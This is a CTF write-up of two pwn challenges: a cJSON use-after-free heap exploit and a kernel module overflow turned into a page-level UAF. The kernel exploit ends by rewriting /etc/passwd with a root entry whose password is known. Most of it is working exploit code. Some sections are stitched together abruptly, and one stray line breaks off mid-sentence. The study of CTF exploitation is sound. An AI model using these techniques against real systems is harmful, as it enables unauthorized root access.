For Lag and Crash this year, I wrote 2 pwn challenges, `feedback-form` and `Trump
Dating Simulator`, which were released in waves 1 and 3 respectively. Both
challenges incorporated some interesting stuff I thought of during my infinite
admin time in NS, so I hope it was fun and educational for everyone! These are
my writeups for my challenges, as well as other interesting pwn challenges by
other authors in the CTF!

# feedback-form

<Challenge title="feedback-form" solves={0}
flag='LNC25{"solved":true,"response":"h0pe_y0u_enj0y3d_th3_ctf"}'>

Please give us a 5-star rating!

</Challenge>

Not sure why this challenge had so few solves, did people not want to submit
feedback? /j

## Analysis

This challenge is all about exploiting the
[cJSON](https://github.com/DaveGamble/cJSON) struct. All input is parsed as JSON
objects, and looking at the actions we can perform:

```json
{"actions": ["get_feedback", "show_feedback"]}
```

we realize it's quite limited as compared to a normal heap challenge, so
exploiting the management of the cJSON objects we have control over is key.

The program accepts feedback in the form of this JSON object:

```json
{
  "username": "asdf",
  "ratings": [5, 5, 5]
}
```

After submitting feedback, any ratings that are less than 5 will be deleted from
the object. The object is then stored in a global pointer, which we can view
later at some point in time. If feedback is submitted again, the previous
feedback is freed and replaced with the new feedback.

Though source wasn't given, the binary isn't meant to be hard to reverse, and
the only barrier to reversing might be the absence of the cJSON type, which can
be easily added in IDA by opening the "Local Types" view under `View > Open
subviews > Local types` and copy-pasting the type definition from the Github
repo.

## Vulnerability

Under `get_feedback`, we see the bug in how the non 5-star ratings are
deleted:

```c
  for ( i = ObjectItem->child; i; i = i->next )
  {
    if ( i->type != 8 || i->valueint <= 4 )
    {
      cJSON_Delete(i);
      return puts(
               "{\"success\": true, \"message\": \"any ratings less than 5 stars have been removed, thank you for your va"
               "lued feedback\"}");
    }
  }
```

It's hard to notice just by reading the decompilation, because this usage of
`cJSON_Delete` doesn't seem suspicious at all. However, if we try viewing the
feedback after submitting a feedback with non-5-star ratings, the program will
crash. This should hopefully lead us to investigate how `cJSON_Delete` works,
and why it shouldn't be used on children objects.

```c
_int64 *__fastcall cJSON_Delete(cJSON *a1)
{
  __int64 *result; // rax
  __int64 *next; // [rsp+18h] [rbp-8h]

  while ( a1 )
  {
    next = (__int64 *)a1->next;
    if ( (a1->type & 0x100) == 0 && a1->child )
      cJSON_Delete(a1->child);
    if ( (a1->type & 0x100) == 0 && a1->valuestring )
    {
      (*(&global_hooks + 1))(a1->valuestring);
      a1->valuestring = 0LL;
    }
    if ( (a1->type & 0x200) == 0 )
    {
      if ( a1->string )
      {
        (*(&global_hooks + 1))(a1->string);
        a1->string = 0LL;
      }
    }
    (*(&global_hooks + 1))(a1);
    result = next;
    a1 = (cJSON *)next;
  }
  return result;
}
```

We can see that the implementation will loop through and delete all items of an
object's linked list. However, it doesn't actually go back to the previous item
in the linked list, which means that deleting a child object instead of the root
parent object will likely result in UAF.

## Upgrading the UAF

Let's take a look at our new and shiny UAF object.

```c
typedef struct cJSON
{
    /* next/prev allow you to walk array/object chains. Alternatively, use GetArraySize/GetArrayItem/GetObjectItem */
    struct cJSON *next;
    struct cJSON *prev;
    /* An array or object item will have a child pointer pointing to a chain of the items in the array/object. */
    struct cJSON *child;

    /* The type of the item, as above. */
    int type;

    /* The item's string, if type==cJSON_String  and type == cJSON_Raw */
    char *valuestring;
    /* writing to valueint is DEPRECATED, use cJSON_SetNumberValue instead */
    int valueint;
    /* The item's number, if type==cJSON_Number */
    double valuedouble;

    /* The item's name string, if this item is the child of, or is in the list of subitems of an object. */
    char *string;
} cJSON;
```

As can be seen, the next and prev pointers overlap with the fd and bk pointers
of freed chunks, which is most likely what caused our program to crash - the
`cJSON_PrintUnformatted` function tries to dereference the encrypted fd pointer
of a tcache chunk and SIGSEGVs. There are quite a few other fields from which we
can possibly get our leak from, like valuestring, valueint etc. Unfortunately,
we see that when creating a new cJSON object, the entire object is cleared
before being used:

```c
void *__fastcall cJSON_New_Item(__int64 (__fastcall **a1)(__int64))
{
  void *s; // [rsp+18h] [rbp-8h]

  s = (void *)(*a1)(64LL);
  if ( s )
    memset(s, 0, 0x40uLL);
  return s;
}
```

Therefore, in order to get these fields to leak some heap/libc pointers, we
either need to overwrite them using the UAF, or groom the heap such that the
start of an unsorted chunk lies exactly 0x10 before a field we want to use to
leak. Since we don't have any leaks, only the latter option is viable for now
(we can use the former for a secondary leak later).

## Seeding the heap

Tcache chunks aren't useful for our leak at the moment, as its only leak via the
fd pointer is encrypted and hence can't be dereferenced, but it doesn't align
with valueint, so we basically can't use it as a leak. In addition, it's much
easier to do the feng shui with an unsorted chunk instead, as it can be split
into remainder chunks when serving allocation requests smaller than its size.
This allows us to adjust the position of the main_arena pointer very precisely,
by allocating a smaller chunk of a specific size, without having to do too much
feng shui.

Having said that, we should want to move our tcache/fastbin size allocations to
a common area so that they don't interfere with our desired unsorted chunks. We
can do this by "seeding" the heap with enough chunks of required sizes. This
way, they'll be already allocated and freed on the heap, and will be reused for
future requests, leaving our desired fastbin/unsorted chunks contiguous and intact.

```python
def seed_heap_for_fengshui():
    # we can use strings to get custom sizes too
    json_payload = {
      "a": ["a"*(seeded_size), 1, 2, 3]
    }
    payload = json.dumps(json_payload).encode()
    p.sendlineafter(b">", payload)
```

We can always modify this seeding process later to suit our needs. Now, let's
create the UAF and try to align unsorted pointers with valuestr.

## Getting a heap leak

```python
seeded_size = 0x510
def create_freed_chunks():
    p.sendlineafter(b">", b'{"action": 0}')

    json_payload = {
        "ratings": [
            {"a"*0x40: ["a"*(seeded_size), 7, 7, 7, 7, 7, 7, 7]}
        ],
        "username": "b"*0x8
    }
    payload = json.dumps(json_payload).encode()
    p.sendlineafter(b">", payload)

def perform_heap_leak():
    # do initial alloc to put main_arena pointers at uaf.valuestring
    payload = b'"'
    payload += b"a"*(0x4d0)
    payload += b'"'
    p.sendlineafter(b">", payload)

    misalign_payload = b"a"*0x4c0
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0010" + b"\\u0000" * 6

    json_payload = {
        "action": 1,
        "DEADBEEF": 1,
    }
    payload = json.dumps(json_payload).encode()
    payload = payload.replace(b"DEADBEEF", misalign_payload)

    p.clean()
    p.sendline(payload)
```

In `create_freed_chunks(){:python}`, we create a really long string of length
0x510. This string will be freed since its type doesn't match the cJSON_Number
type. We'll be using this for our UAF.

Between `create_freed_chunks(){:python}` and `perform_heap_leak(){:python}`,
let's inspect the heap state.

```

These are our 2 large string chunks, separated by our freed UAF object, at
0x555555572820. Since they're separated by a fastbin chunk, we can merge them
together using `malloc_consolidate` to form 1 really large unsorted chunk. Then,
we'll use this chunk and align the UAF over its main_arena pointers.


```python
def perform_heap_leak():
    # do initial alloc to put main_arena pointers at uaf.valuestring
    payload = b'"'
    payload += b"a"*(0x4d0)
    payload += b'"'
    p.sendlineafter(b">", payload)

    misalign_payload = b"a"*0x4c0
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0010" + b"\\u0000" * 6

    json_payload = {
        "action": 1,
        "DEADBEEF": 1,
    }
    payload = json.dumps(json_payload).encode()
    payload = payload.replace(b"DEADBEEF", misalign_payload)

    p.clean()
    p.sendline(payload)
```

In `perform_heap_leak(){:python}`, we allocate a string that is larger than the
unsorted chunk, which triggers `malloc_consolidate` coalescing all our chunks
together. This chunk is immediately freed, which returns it back to the
coalesced chunk, forming a chunk of size 0xa30.

```ansi
[32mFree chunk (unsortedbin)[39m | [33mPREV_INUSE[39m

[91mfd[39m: 0x155555403b20
[91mbk[39m: 0x155555403b20
```

Now, we allocate a string that is just short enough such that the remainder
chunk starts exactly at valuestring-0x10 of our UAF string (which was the 0x50
fastbin chunk from earlier), causing main_arena pointer to be placed at
`uaf->valuestring{:c}`. Since we also did the `view_feedback` action when
writing to our UAF, the JSON object will be immediately printed, with our UAF
object now a JSON string pointing to main_arena, with its contents being a heap
leak. Additionally, since we can now control the next pointer of the UAF object,
we can set it to NULL to prevent the program from reaching non-dereferencable
tcache chunks.

```ansi
{"action": "show_feedback"}
{"ratings":["[91m\xb0q,H\xb9X[39m"],"username":"bbbbbbbb"}
{"actions": ["get_feedback", "show_feedback"]}
/* example input */ {"action": 0}
> 
```

## Arbitrary read

It's trivial to do our libc leak now, because we can directly overwrite an
address with some other address on the heap. Recalling the state of the heap,
the objects we allocated earlier should now be freed. However, we notice that we
now have tcache chunks between our previously consolidated unsorted chunk, but
it's not so important now that we can overwrite addresses.

Recalling that our UAF object is still at 0x555555572820, we can use the first
unsorted chunk to fake our object. However, we need to be careful that the total
length of the encoded string doesn't exceed 0x560 bytes, if not the string won't
be allocated from the correct chunk.

```python
def perform_libc_leak():
    assert heap_leak != 0x0

    misalign_payload = b"b"*0x4c0
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"b" * 8
    misalign_payload += b"\\u0000" * 8
    misalign_payload += b"\\u0010" + b"\\u0000" * 7
    misalign_payload += cjson_pack(heap_leak - 0x78)

    json_payload = {
        "action": 1,
        "DEADBEEF": 1,
    }
    payload = json.dumps(json_payload).encode()
    payload = payload.replace(b"DEADBEEF", misalign_payload)

    p.clean()
    p.sendline(payload)
```

## Arbitrary free and win

With a libc leak, our exploit is almost complete. Using the same UAF object, we
attack its child pointer for an arbitrary free, making it point to a fake cJSON
object of our own. This cJSON object will be passed to `cJSON_Delete`, where
both itself and its valuestring will be freed. If we make its valuestring point
to some region within itself, we will then have overlapping chunks which can be
used for our arb write.

ROP LLC's new data center is managed by sysadmin Jack, who spends all of his

This challenge was set by Kaligula, and it's a kernel pwn challenge as usual!
I'm excited to try out her challenge and learn more new kernel stuff.

    message_buf = kzalloc(size * 2, GFP_KERNEL_ACCOUNT); 
    secret_msg->size = size; 
    secret_msg->message = (uint64_t)message_buf; 
    pr_info("Secret message created!\n"); 
    secret_message_created = 1;
    mutex_unlock(&mod_mutex); 
    return 0; 
    break;
}
```

The kernel module is quite simple. We can store a secret message of `size <=
0x400{:c}` (it's a `uint16_t{:c}` array so actual size is up to 0x800). The
message is allocated with `GFP_KERNEL_ACCOUNT{:c}`, so it will be placed in cg
caches.

```c
case WRITE_SECRET_MESSAGE: {
    if (secret_message_written == 1) {
        pr_info("Secret message has already been
                written!\n"); 
        mutex_unlock(&mod_mutex); 
        return -1; 
        break;
    }
    if (secret_message_created == 0 || secret_msg == 0) {
        pr_info("Secret message does not exist!\n"); 
        mutex_unlock(&mod_mutex); 
        return -1; 
        break; 
    }
    size = secret_msg->size; 
    ret = copy_from_user(buf, (void __user *)
                               user_data.message, size);
    for (int i = 0; i < size; i++) {
        ((uint16_t*)secret_msg->message)[i] = buf[i];
    }
    ((uint16_t*)secret_msg->message)[size] = 0x0;
    pr_info("Secret message written!\n");
    secret_message_written = 1; 
    mutex_unlock(&mod_mutex); 
    return 0; 
    break;
}
```

When writing to the message, we have a 2-byte null-byte heap overflow which we
can use to overwrite important objects that are allocated in cg caches. One such
object that comes to mind is the `struct pipe_buffer{:c}` object.

```c
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```

Allocated in `kmalloc-cg-1k`, it has a `struct page{:c}` pointer at the very
start of the struct which can be overwritten with the 2 null bytes. This will
change the pointer from something like `0xffffea00002a4fc0{:c}` to
`0xffffea00002a0000{:c}`, which may end up overlapping with another `struct
page{:c}` if we're lucky (or if we spray enough).

## `struct page{:c}` and `struct pipe_buffer{:c}`

We know that `pipe_buffer` is used to link 2 file descriptors
together, such that we can write to one and read from the other. It does so
through `struct page{:c}`, which tracks and manage references to a physical
memory page. The underlying physical page is what we are writing to and reading
from in the `pipe_buffer`. Initially, when allocated via creation of
`pipe_buffer`, the `struct page{:c}` looks like this:

```ansi
[1m[32mgef> [0mx/8gx 0xffffea0000247540
[34m0xffffea0000247540[39m:     0x0100000000000000      0x0000000000000000
[34m0xffffea0000247550[39m:     0xdead000000000122      0x0000000000000000
[34m0xffffea0000247560[39m:     0x0000000000000000      0x0000000000000000
[34m0xffffea0000247570[39m:     0x00000001ffffffff      0xffff88800716ca82
```

The steps to manually convert a `struct page{:c}` into a physical address are
very complicated, but basically this macro is used:

```c
/*
 * Change "struct page" to physical address.
 */
#define page_to_phys(page)    ((dma_addr_t)page_to_pfn(page) << PAGE_SHIFT)
```

More info about how the kernel handles pages [can be found
here](https://litux.nl/mirror/kerneldevelopment/0672327201/ch11lev1sec1.html).

For our purposes, it isn't very important to resolve the physical address anyway
because we can't access it via gdb unless it has a virtual address mapped to it,
which isn't the case for `pipe_buffer`'s `struct page{:c}`, as it's
mapped with `GFP_HIGHUSER{:c}` in `pipe_write(){:c}`, and high addresses don't
have a permanent virtual mapping in kernel according to the documentation linked
above.

> Errata: even though the page is allocated using `GFP_HIGHUSER`, there is no
> high memory in x86-64, because the kernel is able to map all physical
> addresses to virtual address space, unlike in x86-32. Therefore, the page
> falls back to `ZONE_NORMAL`, which is a physical page that has a permanent
> virtual address mapped to it in the kernel.

```c
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
  // ...
  if (!page) {
    page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
    if (unlikely(!page)) {
      ret = ret ? : -ENOMEM;
      break;
    }
    pipe->tmp_page = page;
  }
  // ...
}
```

Also, [bata24/gef](https://github.com/bata24/gef) has a command page2virt that
can translate a `struct page *` to a virtual address. (also `page2phys`,
`virt2page` and `phys2page`). Using this, we can resolve the virtual address of
the page and view its contents.

## `struct page{:c}` and the SLUB allocator

`struct page{:c}` is also used by the SLUB allocator to maintain a slab cache,
from which it allocates objects (or nodes). A slab, like `kmalloc-cg-1k`, refers
to the higher-order allocation used to hold a group of same-sized objects, and a
slab cache is a linked list of slabs that are all used for a certain size/type
of object. Allocations from `kmalloc(){:c}` or `kmem_alloc_cache(){:c}` follow
this pipeline when looking for a suitable slab in the slab cache:

1. Check the active slab if it has free nodes (aka the lockless freelist) -
  this is the fast path allocation.
2. If the active slab is full, `__slab_alloc(){:c}` is called, where we check
  if we have any partial slabs. If a partial slab is found, we make
  this slab the new active slab, and allocate an object from here.
3. If there are no partial slabs, then we need to create a new slab by
  allocating a new page. This is done via `new_slab(){:c}` which eventually
  calls `alloc_page(){:c}`, getting a page from the buddy allocator.

(All this logic can be found starting from `__slab_alloc_node(){:c}`)

---

Now we know that a free page from `pipe_buffer` can be allocated for the SLUB
allocator, the possibilities are endless! If we have a UAF on a `pipe_buffer`'s
`struct page{:c}`, we can get the kernel to return the freed page for any object
we wish, and then overwrite the objects allocated in our victim page using the
`pipe_buffer`.

## Exploit plan

Our plan is to spray `struct file{:c}` objects onto the victim page, and
overwrite `file->fmode_t{:c}`, which will then allow us to change the
permissions for that file. This will allow us to write to something sensitive
like `/etc/passwd`, and we can then set the root password to something we know.

```c
struct file {
  atomic_long_t     f_count;
  spinlock_t      f_lock;
  fmode_t       f_mode;
  const struct file_operations  *f_op;
  struct address_space    *f_mapping;
  void        *private_data;
  struct inode      *f_inode;
  unsigned int      f_flags;
  unsigned int      f_iocb_flags;
  const struct cred   *f_cred;
  /* --- cacheline 1 boundary (64 bytes) --- */
  struct path     f_path;
  union {
    /* regular files (with FMODE_ATOMIC_POS) and directories */
    struct mutex    f_pos_lock;
    /* pipes */
    u64     f_pipe;
  };
  loff_t        f_pos;
#ifdef CONFIG_SECURITY
  void        *f_security;
#endif
  /* --- cacheline 2 boundary (128 bytes) --- */
  struct fown_struct    *f_owner;
  errseq_t      f_wb_err;
  errseq_t      f_sb_err;
#ifdef CONFIG_EPOLL
  struct hlist_head   *f_ep;
#endif
  union {
    struct callback_head  f_task_work;
    struct llist_node f_llist;
    struct file_ra_state  f_ra;
    freeptr_t   f_freeptr;
  };
  /* --- cacheline 3 boundary (192 bytes) --- */
} __randomize_layout
  __attribute__((aligned(4)));  /* lest something weird decides that 2 is OK */
```

We know that `struct file{:c}` objects are allocated in the `filp` cache, based
on the allocation path in `alloc_empty_file(){:c}`:

```c
// called from alloc_file
struct file *alloc_empty_file(int flags, const struct cred *cred)
{
  // ...
  f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL);
  // ...
}

void __init files_init(void)
{
    struct kmem_cache_args args = {
        .use_freeptr_offset = true,
        .freeptr_offset = offsetof(struct file, f_freeptr),
      };

    filp_cachep = kmem_cache_create("filp", sizeof(struct file), &args,
                                            SLAB_HWCACHE_ALIGN | SLAB_PANIC |
                                            SLAB_ACCOUNT |
                                    SLAB_TYPESAFE_BY_RCU);
    percpu_counter_init(&nr_files, 0, GFP_KERNEL);
}
```

So what we want is to free the `pipe_buffer`'s `struct page{:c}`, and then
allocate a filp `struct page{:c}` onto the victim page.

## Pre-setup

Before we commence with the exploit, let's do some setup to make our exploit
success rate higher.

```c
CPU_ZERO(&cpu_set);
CPU_SET(0, &cpu_set);
sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

open_dev();
pprintf("opened device on fd %d, starting exploit", fd);

// pre-spray some files to fill up filp cache
for (int i = 0; i < NUM_SPRAY_FILE; i++) {
   open("/etc/passwd", O_RDONLY);
}

for (int i = 0; i < pipe_buf_spray; i++) {
  buf[0] = i;
  assert(pipe(pipe_buf_fds[i]) != -1);
  write(pipe_buf_fds[i][1], buf, 0x30); 
  if (i == pipe_buf_spray / 2) {
    do_create_secret_message(0x400 / 2);
  }
}
```

First, we only want to use CPU0 so that our spray will be more consistent.

Second, we can do an initial spray of files to drain the filp cache of slabs, so
that opening files later will most likely trigger the allocation of a new page.

Lastly, we spray `pipe_buffers` and insert the secret message inside the spray.
In theory, the more `pipe_buffers` we spray, the higher chance we have for the
exploit to succeed, since it's more likely for a `pipe_buffer`'s `struct
page{:c}` to be found at 0xXXXXXXXX0000. Strangely, it seems like if we spray
too many `pipe_buffers`, the secret message has a lower chance to be allocated
right before a `pipe_buffer` object, which causes the entire OOB to fail in the
first place.

## UAF time

```c
user_req.size = 0x200;
user_req.message = *payload;
do_write_secret_message(&user_req);

// at this point we should have overwritten one of the pages
// lets find the victim pipe_buf
size_t original = 0;
size_t victim = 0;
for (int i = 0; i < pipe_buf_spray; i++) {
  size_t buf[2];
  assert(read(pipe_buf_fds[i][0], buf, 0x10) != -1);
  if (buf[0] != i) {
    assert(0 <= buf[0] && buf[0] < pipe_buf_spray);
    pprintf("found mismatch %p at idx %p", buf[0], i);
    *original = buf[0];
    *victim = i;
  }
}

// now close the original pipe_buffer
assert(close(pipe_buf_fds[original][0]) != -1);
assert(close(pipe_buf_fds[original][1]) != -1);
```

Now, we target the `struct page{:c}` pointer with the oob write. After doing so,
we need a way to identify which `pipe_buffer` has been overwritten, and which
`pipe_buffer`'s page it is now pointing to. In the initial spray, we wrote the
index of the `pipe_buffer` to the start of the page. If we compare this index
against the actual index in our code, we can then identify both the victim and
original `pipe_buffer`.

Lastly, to free the `struct page{:c}`, we simply close both fds of the original
`pipe_buffer`. Now, the freed page should look like this:

```ansi
[1m[32mgef> [0mx/8gx 0xffffea0000220000
[34m0xffffea0000220000[39m:     0x0100000000000000      0xffffea00007c2748

```

with fd and bk pointers to the freelist of pages. We still have reference to
this `struct page{:c}` via the victim `pipe_buffer`, giving us our UAF.

## Attacking `struct file{:c}`

```c
// now we have page-level uaf via victim
// fill to the next file object
write(pipe_buf_fds[victim][1], &buf[5], 0x30);

// spray a few more files, no need for a lot since we already drained the filp beforehand
size_t final_file_spray = 0x200;
int filefds[final_file_spray];
for (int i = 0; i < final_file_spray; i++) {
    filefds[i]= open("/etc/passwd", O_RDONLY);
    assert(filefds[i] != -1);
}

uint32_t tmp[0x10];
tmp[0] = 0x1;
tmp[1] = 0x0;
tmp[2] = 0x0;
tmp[3] = 0x480e801f;
pprintf("%d", write(pipe_buf_fds[victim][1], tmp, 0x10));
pprintf("%s", strerror(errno));

char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/bash\n";

for (int i = 0; i < final_file_spray; i++) {
  if (write(filefds[i], payload, sizeof(payload)) > 0) {
    pprintf("write success at fptr %d! password is cafebabe", i);
    break;
  }
}
```

Before we spray the `struct file{:c}` again, we want to make the cursor of the
victim `pipe_buf` point to the start of a potential `struct file{:c}` - which
means it should be 0xc0 from the start of the page, pointing to the 2nd node of
the filp cache since the size of `struct file{:c}` is 0xc0.

After this, we can spray a few more files to make sure the UAF page is allocated
by buddy, and the slab's 2nd node is also allocated by SLUB. The page now looks
something like this, if successful:

```ansi
[1m[32mgef> [0mx/8gx 0xffffea0000220000
[34m0xffffea0000220000[39m:     0x0100000000000000      0xffff888003d41400

```

The pointer at +0x8, if we view its contents, contains some string values that
refer to "filp", which is how we know the page has been successfully allocated
for the filp slab cache.

The value of `file->f_mode{:c}` is `0x084a801d{:c}`. Both `FMODE_WRITE` (1 \<\< 1)
and `FMODE_CAN_WRITE` (1 \<\< 18) are set to 0, which will fail the following
checks in `vfs_write(){:c}`:

```c
ssize_t vfs_write(struct file *file, const char __user *buf, size_t count,
                  loff_t *pos)
{
    ssize_t ret;

    if (!(file->f_mode & FMODE_WRITE))
        return -EBADF;
    if (!(file->f_mode & FMODE_CAN_WRITE))
        return -EINVAL;
    // ..
}
```

Our write primitive should set the value to `0x084a80d | FMODE_WRITE |
FMODE_CAN_WRITE{:c}`, which is `0x84e801f{:c}`.

To see if this succeeds, we simply try to write to every single file that we've
opened, and if `write(){:c}` doesn't return -1, we would have successfully
written to the file. If so, `/etc/passwd` will already be overwritten, and we
can exit the program and login as root!
